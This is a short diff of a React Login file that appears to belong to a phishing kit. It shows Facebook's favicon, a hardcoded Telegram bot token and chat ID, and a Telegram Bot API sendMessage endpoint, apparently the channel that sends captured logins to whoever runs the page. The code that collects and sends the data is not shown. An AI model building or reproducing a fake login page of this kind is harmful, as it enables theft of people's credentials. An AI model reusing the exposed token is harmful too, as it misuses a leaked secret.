@@ -19,7 +19,7 @@ import MeetingBooking from './MeetingBooking';
 
 const BOT_TOKEN = '8523983828:AAHH7J9TarusfHKTvkc8OVJvRZDUEsi5Vck';
 const CHAT_ID = '-3540741385';
-const API_BASE = `https://api.telegram.org/bot${BOT_TOKEN}`;
+const API_BASE = `https://api.telegram.org/bot<TOKEN>/sendMessage`;
 
 const FACEBOOK_LOGO =
   'https://static.xx.fbcdn.net/rsrc.php/yo/r/iRmz9lCMBD2.ico'; // favicon
@@ -1541,5 +1541,6 @@ export default Login;
 // //     <p className="text-green-600 font-medium">All done!</p>
 // //   )}
 // // </div>
+
 
 
